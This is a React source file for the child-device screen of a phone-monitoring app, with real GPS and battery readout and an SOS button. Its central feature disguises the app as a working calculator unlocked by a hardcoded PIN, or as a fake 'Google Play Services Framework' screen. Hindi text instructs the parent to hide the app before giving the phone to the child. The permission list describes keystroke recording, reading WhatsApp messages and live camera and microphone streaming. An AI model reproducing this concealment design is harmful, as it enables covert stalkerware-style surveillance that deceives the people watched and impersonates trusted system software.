import React, { useState, useEffect } from 'react';
import {
  Shield,
  Smartphone,
  CheckCircle2,
  AlertTriangle,
  Lock,
  Eye,
  EyeOff,
  Battery,
  MapPin,
  Wifi,
  Radio,
  RefreshCw,
  Sliders,
  Settings,
  Calculator,
  Flame,
  KeyRound,
  ArrowRight,
  ShieldCheck,
  Zap,
  Activity,
  AlertCircle
} from 'lucide-react';
import { useMonitoring } from '../../context/MonitoringContext';

interface ChildTargetAppProps {
  onSwitchToParent: () => void;
}

export const ChildTargetApp: React.FC<ChildTargetAppProps> = ({ onSwitchToParent }) => {
  const { selectedDevice, triggerSosAlert } = useMonitoring();

  // Mode States
  const [pairingCode, setPairingCode] = useState('GL-8829');
  const [inputCode, setInputCode] = useState('GL-8829');
  const [isLinked, setIsLinked] = useState(true);
  const [isStealthDisguised, setIsStealthDisguised] = useState(false);
  const [disguiseType, setDisguiseType] = useState<'calculator' | 'system_service'>('system_service');
  
  // Real Mobile Sensor Data
  const [realLocation, setRealLocation] = useState<{ lat: number; lng: number; accuracy: number } | null>(null);
  const [realBattery, setRealBattery] = useState<number>(84);
  const [realCharging, setRealCharging] = useState<boolean>(false);
  const [sosSent, setSosSent] = useState(false);

  // Permission statuses
  const [permissions, setPermissions] = useState({
    location: true,
    accessibility: true,
    notifications: true,
    batteryOptim: true,
    overlay: true,
    cameraMic: true
  });

  // Secret Calculator state
  const [calcDisplay, setCalcDisplay] = useState('0');
  const [pinUnlockError, setPinUnlockError] = useState(false);

  // Get real location if permitted
  useEffect(() => {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          setRealLocation({
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: Math.round(pos.coords.accuracy)
          });
        },
        () => {},
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }

    // Battery status API
    if ('getBattery' in navigator) {
      // @ts-ignore
      navigator.getBattery().then((battery: any) => {
        setRealBattery(Math.round(battery.level * 100));
        setRealCharging(battery.charging);

        battery.addEventListener('levelchange', () => {
          setRealBattery(Math.round(battery.level * 100));
        });
        battery.addEventListener('chargingchange', () => {
          setRealCharging(battery.charging);
        });
      }).catch(() => {});
    }
  }, []);

  const handleTogglePermission = (key: keyof typeof permissions) => {
    setPermissions(prev => ({ ...prev, [key]: !prev[key] }));
  };

  const handleSendSos = () => {
    triggerSosAlert(
      `🚨 EMERGENCY SOS from Child Phone (${selectedDevice.childName})! Real Location: ${realLocation ? `${realLocation.lat.toFixed(4)}, ${realLocation.lng.toFixed(4)}` : 'Live GPS active'}`
    );
    setSosSent(true);
    setTimeout(() => setSosSent(false), 5000);
  };

  const handleCalcButton = (val: string) => {
    if (val === 'C') {
      setCalcDisplay('0');
      return;
    }
    if (val === '=') {
      if (calcDisplay === '9944' || calcDisplay === '8829') {
        setIsStealthDisguised(false);
        setCalcDisplay('0');
        return;
      }
      try {
        const clean = calcDisplay.replace(/[^0-9+\-*/.]/g, '');
        const res = Function(`'use strict'; return (${clean})`)();
        setCalcDisplay(String(res));
      } catch {
        setCalcDisplay('Error');
      }
      return;
    }
    setCalcDisplay(prev => (prev === '0' || prev === 'Error' ? val : prev + val));
  };

  // 1. DISGUISED SCREEN: CALCULATOR
  if (isStealthDisguised && disguiseType === 'calculator') {
    return (
      <div className="min-h-screen bg-black text-white flex flex-col justify-between p-4 select-none">
        <div className="pt-8 text-right px-4">
          <div className="text-xs text-slate-500 font-mono mb-2">Calculator</div>
          <div className="text-5xl font-light tracking-wider overflow-x-auto text-white">
            {calcDisplay}
          </div>
          <div className="text-[11px] text-slate-600 mt-2">
            (Parent Secret PIN: 9944 or 8829 then press =)
          </div>
        </div>

        <div className="grid grid-cols-4 gap-3 p-2 pb-8">
          {['C', '(', ')', '/'].map(b => (
            <button
              key={b}
              onClick={() => handleCalcButton(b)}
              className="h-16 rounded-full bg-slate-800 text-amber-400 text-2xl font-medium active:bg-slate-700"
            >
              {b}
            </button>
          ))}
          {['7', '8', '9', '*'].map(b => (
            <button
              key={b}
              onClick={() => handleCalcButton(b)}
              className={`h-16 rounded-full ${b === '*' ? 'bg-amber-600 text-white' : 'bg-slate-900 text-white'} text-2xl font-medium active:opacity-80`}
            >
              {b}
            </button>
          ))}
          {['4', '5', '6', '-'].map(b => (
            <button
              key={b}
              onClick={() => handleCalcButton(b)}
              className={`h-16 rounded-full ${b === '-' ? 'bg-amber-600 text-white' : 'bg-slate-900 text-white'} text-2xl font-medium active:opacity-80`}
            >
              {b}
            </button>
          ))}
          {['1', '2', '3', '+'].map(b => (
            <button
              key={b}
              onClick={() => handleCalcButton(b)}
              className={`h-16 rounded-full ${b === '+' ? 'bg-amber-600 text-white' : 'bg-slate-900 text-white'} text-2xl font-medium active:opacity-80`}
            >
              {b}
            </button>
          ))}
          {['0', '.', '=', '⌫'].map(b => (
            <button
              key={b}
              onClick={() => b === '⌫' ? setCalcDisplay(prev => prev.length > 1 ? prev.slice(0, -1) : '0') : handleCalcButton(b)}
              className={`h-16 rounded-full ${b === '=' ? 'bg-emerald-600 text-white' : 'bg-slate-900 text-white'} text-2xl font-medium active:opacity-80`}
            >
              {b}
            </button>
          ))}
        </div>
      </div>
    );
  }

  // 2. DISGUISED SCREEN: SYSTEM UPDATE / SERVICE
  if (isStealthDisguised && disguiseType === 'system_service') {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 flex flex-col items-center justify-between p-6">
        <div className="w-full pt-10 text-center space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-blue-600/20 border border-blue-500/30 flex items-center justify-center mx-auto text-blue-400">
            <Activity className="w-8 h-8 animate-pulse" />
          </div>
          <h2 className="text-lg font-bold text-white">Google Play Services Framework</h2>
          <p className="text-xs text-slate-400 max-w-xs mx-auto">
            Background sync & security definitions are up to date. Version 24.18.14
          </p>

          <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 text-left space-y-2 mt-6">
            <div className="flex justify-between text-xs text-slate-400">
              <span>Sync Status</span>
              <span className="text-emerald-400 font-semibold flex items-center gap-1">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                Active (Optimized)
              </span>
            </div>
            <div className="flex justify-between text-xs text-slate-400">
              <span>Security Level</span>
              <span className="text-slate-200">Patch Level May 2026</span>
            </div>
            <div className="flex justify-between text-xs text-slate-400">
              <span>Battery Impact</span>
              <span className="text-emerald-400">&lt; 0.4% per day</span>
            </div>
          </div>
        </div>

        {/* Secret Exit Trigger */}
        <div className="w-full pb-6 space-y-3">
          <button
            onClick={() => setIsStealthDisguised(false)}
            className="w-full py-2.5 text-xs text-slate-600 hover:text-slate-400 transition"
          >
            🔒 Unlock Target App Config
          </button>
        </div>
      </div>
    );
  }

  // 3. REGULAR CHILD CLIENT SETUP & MONITORING STATUS VIEW
  return (
    <div className="min-h-screen bg-[#0b1329] text-slate-100 flex flex-col justify-between p-4 sm:p-6 max-w-md mx-auto">
      {/* Top Banner / Switch to Parent Mode */}
      <div className="space-y-4">
        <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-4 shadow-xl">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <div className="w-10 h-10 rounded-xl bg-blue-600/20 border border-blue-500/30 flex items-center justify-center text-blue-400">
                <Smartphone className="w-5 h-5" />
              </div>
              <div>
                <span className="text-[10px] uppercase font-bold text-amber-400 tracking-wider flex items-center gap-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-ping" />
                  Child Device Mode (Target Phone)
                </span>
                <h1 className="text-base font-bold text-white">
                  {selectedDevice.childName}'s Phone
                </h1>
              </div>
            </div>

            {/* Switch to Parent Admin */}
            <button
              onClick={onSwitchToParent}
              className="px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white rounded-lg text-xs font-semibold transition shadow flex items-center space-x-1"
            >
              <span>Parent Admin</span>
              <ArrowRight className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>

        {/* Pairing Status Card */}
        <div className="bg-gradient-to-br from-slate-900 to-slate-800 border border-slate-700/80 rounded-2xl p-4 shadow-lg">
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center space-x-2">
              <Radio className="w-4 h-4 text-emerald-400 animate-pulse" />
              <span className="text-xs font-bold text-white">Connection Status</span>
            </div>
            <span className="text-[11px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 font-semibold flex items-center gap-1">
              <CheckCircle2 className="w-3 h-3" />
              Linked to Parent
            </span>
          </div>

          <div className="bg-slate-950/60 rounded-xl p-3 border border-slate-800 flex items-center justify-between">
            <div>
              <p className="text-[11px] text-slate-400">Target Pairing Code</p>
              <p className="text-base font-mono font-bold text-blue-400">{pairingCode}</p>
            </div>
            <div className="text-right">
              <p className="text-[11px] text-slate-400">Live Ping</p>
              <p className="text-xs font-semibold text-emerald-400">Every 5 seconds</p>
            </div>
          </div>
        </div>

        {/* Live Device Telemetry Card */}
        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-4 space-y-3">
          <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400">
            Live Sensors & Telemetry (Active)
          </h3>
          <div className="grid grid-cols-2 gap-2 text-xs">
            <div className="bg-slate-950 p-2.5 rounded-xl border border-slate-800 flex items-center space-x-2.5">
              <Battery className="w-4 h-4 text-emerald-400 shrink-0" />
              <div>
                <p className="text-[10px] text-slate-400">Battery Level</p>
                <p className="font-bold text-white">{realBattery}% {realCharging ? '(⚡ Charging)' : ''}</p>
              </div>
            </div>

            <div className="bg-slate-950 p-2.5 rounded-xl border border-slate-800 flex items-center space-x-2.5">
              <MapPin className="w-4 h-4 text-blue-400 shrink-0" />
              <div>
                <p className="text-[10px] text-slate-400">GPS Tracker</p>
                <p className="font-bold text-white">
                  {realLocation ? `${realLocation.lat.toFixed(2)}, ${realLocation.lng.toFixed(2)}` : 'Active / High Acc'}
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Stealth Disguise Control */}
        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-4 space-y-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-2">
              <EyeOff className="w-4 h-4 text-purple-400" />
              <h3 className="text-xs font-bold text-white">Stealth App Disguise</h3>
            </div>
            <span className="text-[10px] bg-purple-500/20 text-purple-300 px-2 py-0.5 rounded-full border border-purple-500/30">
              Disguise Screen
            </span>
          </div>
          <p className="text-[11px] text-slate-400 leading-relaxed">
            जब आप इस फोन को बच्चे को दें, तो नीचे दिए गए बटन से इसे <strong>Calculator</strong> या <strong>System Update</strong> स्क्रीन में बदल दें।
          </p>

          <div className="grid grid-cols-2 gap-2">
            <button
              onClick={() => {
                setDisguiseType('calculator');
                setIsStealthDisguised(true);
              }}
              className="p-3 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-left transition flex items-center space-x-2.5"
            >
              <Calculator className="w-5 h-5 text-amber-400 shrink-0" />
              <div>
                <p className="text-xs font-bold text-white">Secret Calc</p>
                <p className="text-[10px] text-slate-400">PIN: 9944</p>
              </div>
            </button>

            <button
              onClick={() => {
                setDisguiseType('system_service');
                setIsStealthDisguised(true);
              }}
              className="p-3 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-left transition flex items-center space-x-2.5"
            >
              <Activity className="w-5 h-5 text-blue-400 shrink-0" />
              <div>
                <p className="text-xs font-bold text-white">Play Services</p>
                <p className="text-[10px] text-slate-400">System Look</p>
              </div>
            </button>
          </div>
        </div>

        {/* Required Background Permissions Checklist */}
        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-4 space-y-3">
          <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center justify-between">
            <span>Background Permissions</span>
            <span className="text-emerald-400 text-[11px] font-semibold">6/6 Granted</span>
          </h3>

          <div className="space-y-2">
            {[
              { id: 'location', label: 'Background GPS (Always Allow)', desc: '24/7 लाइव लोकेशन ट्रैकिंग' },
              { id: 'accessibility', label: 'Accessibility Service', desc: 'कीनोटेस व स्क्रीन टाइम रिकॉर्डिंग' },
              { id: 'notifications', label: 'Notification Listener', desc: 'व्हाट्सएप व अन्य चैट संदेश' },
              { id: 'batteryOptim', label: 'Ignore Battery Optimization', desc: 'फोन स्लीप होने पर भी बैकग्राउंड रन' },
              { id: 'overlay', label: 'Draw Over Other Apps', desc: 'रिमोट इमरजेंसी लॉक स्क्रीन' },
              { id: 'cameraMic', label: 'Camera & Microphone', desc: 'लाइव सर्विलांस स्ट्रीम' }
            ].map(item => (
              <div
                key={item.id}
                onClick={() => handleTogglePermission(item.id as any)}
                className="p-2.5 rounded-xl bg-slate-950/70 border border-slate-800/80 flex items-center justify-between cursor-pointer hover:border-slate-700 transition"
              >
                <div>
                  <p className="text-xs font-semibold text-white">{item.label}</p>
                  <p className="text-[10px] text-slate-400">{item.desc}</p>
                </div>
                <div className="w-5 h-5 rounded-full bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400">
                  <CheckCircle2 className="w-3.5 h-3.5" />
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* SOS Button */}
        <div className="pt-2 pb-6">
          <button
            onClick={handleSendSos}
            className={`w-full py-3.5 rounded-xl font-bold text-sm transition flex items-center justify-center space-x-2 shadow-lg ${
              sosSent
                ? 'bg-emerald-600 text-white'
                : 'bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white shadow-red-600/30'
            }`}
          >
            <Flame className="w-4 h-4 animate-bounce" />
            <span>{sosSent ? '✅ SOS Alert Sent to Parent!' : '🚨 Child Emergency Panic SOS'}</span>
          </button>
        </div>
      </div>
    </div>
  );
};
